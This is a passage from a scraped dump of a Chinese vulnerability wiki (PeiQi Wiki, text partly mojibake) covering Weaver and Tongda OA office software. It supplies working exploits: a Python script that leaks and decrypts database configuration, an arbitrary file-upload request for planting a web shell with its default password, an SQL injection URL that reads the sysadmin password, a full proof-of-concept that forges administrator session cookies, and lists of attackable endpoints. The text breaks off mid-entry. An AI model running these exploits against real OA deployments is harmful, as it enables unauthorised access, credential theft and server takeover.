req(url): headers = { 'Content-Type':'application/x-www-form-urlencoded', 'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', } r1 = requests.get(url,headers=headers).content s = r1.replace('\\r\\n','') res1 = base64.b64encode(s) postdata = { 'data':res1, 'type':'des', 'arg':'m=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1' } u = 'http://tool.chacuo.net/cryptdes' r2 = requests.post(u,data=postdata,headers=headers).content res2 = ast.literal_eval(r2) return res2['data'] url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp' print req(url) å‚è€ƒæ–‡ç«  [æ›´æ–°]æ³›å¾®e-cology OAæ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´é¢„è­¦ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA sysinterfacecodeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA sysinterfacecodeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"æ³›å¾®OA sysinterfacecodeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼ ","keywords":"","body":"æ³›å¾®OA sysinterface/codeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼  WooYun-2015-0155705 æ¼æ´æè¿° æ³›å¾®OA sysinterface/codeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼ å¯¼è‡´å¯ä»¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ æ¼æ´æè¿° [!NOTE] è¾ƒè€ç‰ˆæœ¬ï¼Œç›®å‰æ— å‡†ç¡®ç‰ˆæœ¬ æ¼æ´å¤ç° filename=******5308.java&filetype=javafilenameä¸ºæ–‡ä»¶åç§° ä¸ºç©ºæ—¶ä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ª String fileid = \"Ewv\"; String readonly = \"\"; boolean isCreate = false; if(StringHelper.isEmpty(fileName)) { Date ndate = new Date(); SimpleDateFormat sf = new SimpleDateFormat(\"yyyyMMddHHmmss\"); String datetime = sf.format(ndate); fileid = fileid + datetime; fileName= fileid + \".\" + filetype; isCreate = true; } else { int pointIndex = fileName.indexOf(\".\"); if(pointIndex > -1) { fileid = fileName.substring(0,pointIndex); }} å‚è€ƒæ–‡ç«  æ³›å¾®OAæœªæˆæƒå¯å¯¼è‡´GetShell PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA V9 ä»»æ„æ–‡ä»¶ä¸Šä¼ .html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA V9 ä»»æ„æ–‡ä»¶ä¸Šä¼ .html","title":"æ³›å¾®OA V9 ä»»æ„æ–‡ä»¶ä¸Šä¼ ","keywords":"","body":"æ³›å¾®OA V9 ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´æè¿° æ³›å¾®OA V9 å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¥å£å¯¼è‡´ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´å½±å“ [!NOTE] æ³›å¾®OA V9 æ¼æ´å¤ç° æ¼æ´ä½äº: /page/exportImport/uploadOperation.jspæ–‡ä»¶ä¸­ Jspæµç¨‹å¤§æ¦‚æ˜¯:åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ˜¯multipartè¯·æ±‚,ç„¶å°±æ²¡æœ‰äº†,ç›´æ¥ä¸Šä¼ äº†,å•Šå“ˆå“ˆå“ˆå“ˆå“ˆ é‡ç‚¹å…³æ³¨File file=new File(savepath+filename), Filenameå‚æ•°,æ˜¯å‰å°å¯æ§çš„,å¹¶ä¸”æ²¡æœ‰åšä»»ä½•è¿‡æ»¤é™åˆ¶ åˆ©ç”¨éå¸¸ç®€å•,åªè¦å¯¹ç€ 127.0.0.1/page/exportImport/uploadOperation.jsp æ¥ä¸€ä¸ªmultipartRequestå°±å¯ä»¥,åˆ©ç”¨ç®€å•,è‡ªè¯„é«˜å±!! ç„¶åè¯·æ±‚ ç„¶åè¯·æ±‚è·¯å¾„: page/exportImport/fileTransfer/1.jsp è¯·æ±‚åŒ… POST /page/exportImport/uploadOperation.jsp HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 397 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68 Origin: null Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 dnt: 1 x-forwarded-for: 127.0.0.1 Connection: close ------WebKitFormBoundary6XgyjB6SeCArD3Hc Content-Disposition: form-data; name=\"file\"; filename=\"test.jsp\" Content-Type: application/octet-stream ------WebKitFormBoundary6XgyjB6SeCArD3Hc-- åœ°å€: /page/exportImport/fileTransfer/test.jsp é»˜è®¤å¯†ç  rebeyond PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 14:18:38 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA V8 SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA V8 SQLæ³¨å…¥æ¼æ´.html","title":"æ³›å¾®OA V8 SQLæ³¨å…¥æ¼æ´","keywords":"","body":"æ³›å¾®OA V8 SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° æ³›å¾®OA V8 å­˜åœ¨SQLæ³¨å…¥æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ¼æ´è·å–ç®¡ç†å‘˜æƒé™å’ŒæœåŠ¡å™¨æƒé™ æ¼æ´å½±å“ [!NOTE] æ³›å¾®OA V8 FOFA [!NOTE] app=\"æ³›å¾®-ååŒåŠå…¬OA\" æ¼æ´å¤ç° åœ¨getdata.jspä¸­ï¼Œç›´æ¥å°†requestå¯¹è±¡äº¤ç»™ weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) : æ–¹æ³•å¤„ç† åœ¨getDataæ–¹æ³•ä¸­ï¼Œåˆ¤æ–­è¯·æ±‚é‡Œcmdå‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œè°ƒç”¨procæ–¹æ³• Procæ–¹æ³•4ä¸ªå‚æ•°ï¼Œ(â€œç©ºå­—ç¬¦ä¸²â€,â€cmdå‚æ•°å€¼â€,requestå¯¹è±¡ï¼ŒserverContextå¯¹è±¡) åœ¨procæ–¹æ³•ä¸­ï¼Œå¯¹cmdå‚æ•°å€¼è¿›è¡Œåˆ¤æ–­ï¼Œå½“cmdå€¼ç­‰äºgetSelectAllIdæ—¶ï¼Œå†ä»è¯·æ±‚ä¸­è·å–sqlå’Œtypeä¸¤ä¸ªå‚æ•°å€¼ï¼Œå¹¶å°†å‚æ•°ä¼ é€’è¿›getSelectAllIdsï¼ˆsql,typeï¼‰æ–¹æ³•ä¸­ æ ¹æ®ä»¥ä¸Šä»£ç æµç¨‹ï¼Œåªè¦æ„é€ è¯·æ±‚å‚æ•° ?cmd= getSelectAllId&sql=select password as id from userinfo; å³å¯å®Œæˆå¯¹æ•°æ®åº“æ“æ§ POC http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager æŸ¥è¯¢HrmResourceManagerè¡¨ä¸­çš„passwordå­—æ®µï¼Œé¡µé¢ä¸­è¿”å›äº†æ•°æ®åº“ç¬¬ä¸€æ¡è®°å½•çš„å€¼ï¼ˆsysadminç”¨æˆ·çš„passwordï¼‰ è§£å¯†åå³å¯ç™»å½•ç³»ç»Ÿ Goby & POC [!NOTE] å·²ä¸Šä¼  https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ç›®å½•ä¸­ Weaver OA 8 SQL injection PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/","title":"é€šè¾¾OA","keywords":"","body":"é€šè¾¾OA é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ é€šè¾¾OA v11.2 åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½• é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE é€šè¾¾OA v11.7åå°SQLæ³¨å…¥æ¼æ´ é€šè¾¾OA v11.7 åœ¨çº¿ç”¨æˆ·ç™»å½•æ¼æ´ é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«XSSæ¼æ´ é€šè¾¾OA v11.8 åå°æ–‡ä»¶åŒ…å«å‘½ä»¤æ‰§è¡Œæ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-08 15:38:39 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ.html","title":"é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ","keywords":"","body":"é€šè¾¾OAéƒ¨åˆ†æ¼æ´ä¿¡æ¯æ•´åˆ é€šè¾¾OAä¿¡æ¯æ”¶é›† http[s]://TongDaOA.domain/inc/expired.php åˆ¤æ–­é€šè¾¾ç‰ˆæœ¬ http[s]://TongDaOA.domain/inc/reg_trial.php http[s]://TongDaOA.domain/inc/reg_trial_submit.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php GET å‚æ•°usernameã€email å¯çˆ†ç”¨æˆ·ã€é‚®ç®± http[s]://TongDaOA.domain/resque/worker.php è®¡ç®—æœºå 2013-2017(SQLi path) http[s]://TongDaOA.domain/module/crm2010/imageOperation/deleteImage.php http[s]://TongDaOA.domain/module/crm2010/product/type_tree.php http[s]://TongDaOA.domain/module/crm2010/select/getData.php http[s]://TongDaOA.domain/module/crm2010/select/getValue.php http[s]://TongDaOA.domain/module/crm2010/select/index.php http[s]://TongDaOA.domain/module/crm2010/share/update.php http[s]://TongDaOA.domain/portal/webportals/source/oa/news.php http[s]://TongDaOA.domain/portal/webportals/source/oa/notify.php?LOGIN_USER_ID= http[s]://TongDaOA.domain/task/crm/account_care_remind.php http[s]://TongDaOA.domain/task/crm/action_link_remind.php http[s]://TongDaOA.domain/task/crm/contract_birthday_remind.php http[s]://TongDaOA.domain/task/crm/contract_near_remind.php http[s]://TongDaOA.domain/task/crm/contract_remind.php http[s]://TongDaOA.domain/task/crm/crm_account_contact_bir_remind.php http[s]://TongDaOA.domain/task/crm/crm_complain_remind.php http[s]://TongDaOA.domain/task/crm/crm_opportunity_status_remind.php http[s]://TongDaOA.domain/task/crm/crm_salepay_remind.php http[s]://TongDaOA.domain/task/crm/crm_stockout_remind.php http[s]://TongDaOA.domain/task/crm/marketing_near_remind.php http[s]://TongDaOA.domain/task/crm/order_to_stockout_remind.php http[s]://TongDaOA.domain/task/crm/payment_near_remind.php http[s]://TongDaOA.domain/task/crm/storage_near_remind.php http[s]://TongDaOA.domain/ispirit/myoa.php http[s]://TongDaOA.domain/ispirit/retrieve_pwd.php v11~v11.6 [0day] http[s]://TongDaOA.domain/general/approve_center/list/roll_config.inc.php http[s]://TongDaOA.domain/general/bi_design/reportshop/report_bi.func.php http[s]://TongDaOA.domain/general/data_center/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/console/autocode/autocode.php http[s]://TongDaOA.domain/general/data_center/model_design/design/report/action.php http[s]://TongDaOA.domain/general/reportshop/design/report/action.php http[s]://TongDaOA.domain/general/project/portal/details/budget/table.php http[s]://TongDaOA.domain/general/reportshop/design/report/console/autocode/autocode.php http[s]://TongDaOA.domain/general/reportshop/workshop/report/attachment-remark/form3.php http[s]://TongDaOA.domain/general/system/user/get_key_user_info.php http[s]://TongDaOA.domain/general/workflow/list/roll_config.inc.php http[s]://TongDaOA.domain/interface/GetNewAPP.php http[s]://TongDaOA.domain/interface/GetNewAPP1.php http[s]://TongDaOA.domain/general/workflow/plugin/turn/kd_k3_applly/kd_k3_applly.php http[s]://TongDaOA.domain/general/workflow/document_list/roll_config.inc.php v11.6 [RCE] http[s]://TongDaOA.domain/module/appbuilder/assets/print.php ä»»æ„æ–‡ä»¶åˆ é™¤ å‚è€ƒæ–‡ç«  é€šè¾¾OAæ¼æ´ä¸€äº›æ¼æ´ç‚¹(Github) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-02 15:10:48 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.2 åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.2 åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html","title":"é€šè¾¾OA v11.2 åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","keywords":"","body":"é€šè¾¾OA v11.2åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´æè¿° é€šè¾¾OA v11.2åå°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œå…è®¸é€šè¿‡ç»•è¿‡é»‘åå•çš„æ–¹æ³•æ¥ä¸Šä¼ æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´æœåŠ¡å™¨è¢«æ”»å‡» å½±å“ç‰ˆæœ¬ [!NOTE] é€šè¾¾OA v11.2 ç¯å¢ƒæ­å»º é€šè¾¾OA v11.2ä¸‹è½½é“¾æ¥ ä¸‹è½½åæŒ‰æ­¥éª¤å®‰è£…å³å¯ æ¼æ´å¤ç° è¯¥æ¼æ´å­˜åœ¨äºåå°ï¼Œéœ€è¦é€šè¿‡ç™»å½•åæ‰èƒ½è¿›è¡Œä½¿ç”¨ ç™»å½•åç‚¹å‡» èœå• -> ç³»ç»Ÿç®¡ç† -> é™„ä»¶ç®¡ç† ç‚¹å‡»æ·»åŠ é™„å½•å­˜å‚¨ç®¡ç†æ·»åŠ å¦‚ä¸‹(å­˜å‚¨ç›®å½•ä¸º webroot ç›®å½•ï¼Œé»˜è®¤ä¸º D:/MYOA/webroot/) ç‚¹å‡» ç»„ç»‡ -> ç³»ç»Ÿç®¡ç†å‘˜ -> ä¸Šä¼ é™„ä»¶ æŠ“åŒ…ä½¿ç”¨ windows çš„ç»•è¿‡æ–¹æ³• shell.php -> shell.php. [!NOTE] 2012 ä¸ºç›®å½• 1717872192 ä¸ºæ‹¼æ¥çš„æ–‡ä»¶å æœ€åçš„shellåå­—ä¸º 1717872192.shell.php è®¿é—®æœ¨é©¬æ–‡ä»¶ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½•.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½•.html","title":"é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½•","keywords":"","body":"é€šè¾¾OA v11.x-v11.5ä»»æ„ç”¨æˆ·ç™»å½• æ¼æ´æè¿° é€šè¾¾OAæ˜¯ä¸€å¥—åŠå…¬ç³»ç»Ÿã€‚2020å¹´04æœˆ17æ—¥, é€šè¾¾OAå®˜æ–¹åœ¨æ›´æ–°äº†ä¸€ä¸ªv11ç‰ˆæœ¬å®‰å…¨è¡¥ä¸, å…¶ä¸­ä¿®å¤äº†ä¸€ä¸ªä»»æ„ç”¨æˆ·ä¼ªé€ ç™»å½•æ¼æ´ã€‚ è¯¥æ¼æ´ç±»å‹ä¸ºä»»æ„ç”¨æˆ·ä¼ªé€ ï¼Œæœªç»æˆæƒçš„è¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ çš„è¯·æ±‚åŒ…è¿›è¡Œä»»æ„ç”¨æˆ·ä¼ªé€ ç™»å½•ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] é€šè¾¾OA 2017ç‰ˆ é€šè¾¾OAç‰ˆæœ¬ V11.X ç¯å¢ƒæ­å»º æ¼æ´ç¯å¢ƒä¸‹è½½ https://cdndown.tongda2000.com/oa/2019/TDOA11.4.exe åŒå‡»å®‰è£…å³å¯ æ¼æ´å¤ç° ä½¿ç”¨POCè·å–ç®¡ç†å‘˜çš„Cookie root@kali:~/æ¡Œé¢# python3 1.py -v 11 -u http://xx.xxx.xxx.xxx [+]Get Available COOKIE:PHPSESSID=sr3f46qg6539khd3e3rrucoa72; path=/ æˆåŠŸè·å¾—Cookie,æ·»åŠ Cookieè®¿é—® http://xxx.xxx.xxx.xxx/general/index.php?isIE=0&modify_pwd=0å³å¯ æ¼æ´åˆ©ç”¨POC ''' @Author : Sp4ce @Date : 2020-03-17 23:42:16 LastEditors : Sp4ce LastEditTime : 2020-08-27 10:21:44 @Description : Challenge Everything. ''' import requests from random import choice import argparse import json USER_AGENTS = [ \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)\", \"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)\", \"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)\", \"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)\", \"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1\", \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0\", \"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5\", \"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\", \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20\", \"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)\", \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)\", \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)\", \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1\", \"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre\", \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0\", \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\", \"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10\" ] headers={} def getV11Session(url): checkUrl = url+'/general/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = str(res.text).split('{') codeUid = resText[-1].replace('}\"}', '').replace('\\r\\n', '') getSessUrl = url+'/logincheck_code.php' res = requests.post( getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if 'ç”¨æˆ·æœªç™»å½•' not in check_available.text: if 'é‡æ–°ç™»å½•' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') except: print('[-]Something Wrong With '+url) def get2017Session(url): checkUrl = url+'/ispirit/login_code.php' try: headers[\"User-Agent\"] = choice(USER_AGENTS) res = requests.get(checkUrl,headers=headers) resText = json.loads(res.text) codeUid = resText['codeuid'] codeScanUrl = url+'/general/login_code_scan.php' res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int( 1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers) resText = json.loads(res.text) status = resText['status'] if status == str(1): getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid res = requests.get(getCodeUidUrl) tmp_cookie = res.headers['Set-Cookie'] headers[\"User-Agent\"] = choice(USER_AGENTS) headers[\"Cookie\"] = tmp_cookie check_available = requests.get(url + '/general/index.php',headers=headers) if 'ç”¨æˆ·æœªç™»å½•' not in check_available.text: if 'é‡æ–°ç™»å½•' not in check_available.text: print('[+]Get Available COOKIE:' + tmp_cookie) else: print('[-]Something Wrong With ' + url + ',Maybe Not Vulnerable.') else: print('[-]Something Wrong With '+url + ' Maybe Not Vulnerable ?') except: print('[-]Something Wrong With '+url) if __name__ == \"__main__\": parser = argparse.ArgumentParser() parser.add_argument( \"-v\", \"--tdoaversion\", type=int, choices=[11, 2017], help=\"Target TongDa OA Version. e.g: -v 11ã€-v 2017\") parser.add_argument( \"-url\", \"--targeturl\", type=str, help=\"Target URL. e.g: -url 192.168.2.1ã€-url http://192.168.2.1\" ) args = parser.parse_args() url = args.targeturl if 'http://' not in url: url = 'http://' + url if args.tdoaversion == 11: getV11Session(url) elif args.tdoaversion == 2017: get2017Session(url) else: parser.print_help() PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE.html","title":"é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE","keywords":"","body":"é€šè¾¾OA v11.6 ä»»æ„æ–‡ä»¶åˆ é™¤&RCE æ¼æ´æè¿° é€šè¿‡ä»»æ„æ–‡ä»¶æ¼æ´åˆ é™¤ä¸Šä¼ ç‚¹åŒ…å«çš„èº«ä»½éªŒè¯æ–‡ä»¶ï¼Œä»è€Œé€ æˆæœªæˆæƒè®¿é—®å®ç°ä»»æ„æ–‡ä»¶ä¸Šä¼  æ¼æ´å½±å“ [!NOTE] é€šè¾¾OA v11.6 ç¯å¢ƒæ­å»º é€šè¾¾OA v11.6ä¸‹è½½é“¾æ¥ ä¸‹è½½å®Œæ¯•ç‚¹å‡»å®‰è£…å³å¯ æ¼æ´å¤ç° ä½¿ç”¨è§£å¯†å·¥å…· SeayDzend(zendè§£å¯†å·¥å…·) å¯¹é€šè¾¾OAçš„åŠ å¯†ä»£ç è¿›è¡Œè§£å¯† [!NOTE] è§£å¯†å·¥å…·å·²ç»æ”¾åœ¨ç›®å½•ä¸‹çš„POCç›®å½•ä¸­ è§£å¯†å®ŒæˆåæŸ¥çœ‹ webroot\\general\\data_center\\utils\\upload.php æ–‡ä»¶ \\r\\n\\r\\n\"; ?> åœ¨ç¬¬ä¸€è¡ŒåŒ…å«äº†æ–‡ä»¶ auth.inc.php include_once \"inc/auth.inc.php\"; å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶ç”¨äºæ£€éªŒæ˜¯å¦ç™»å½•ï¼Œæœªç™»å½•çš„æƒ…å†µæ— æ³•åˆ©ç”¨è¿™ä¸ªæ¼æ´ æŸ¥çœ‹ \\webroot\\module\\appbuilder\\assets\\print.phpæ–‡ä»¶ è¿™é‡Œå¯ä»¥çœ‹åˆ° é¡µé¢è·å– guidå‚æ•°çš„å€¼ ä½¿ç”¨file_existså‡½æ•°åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ 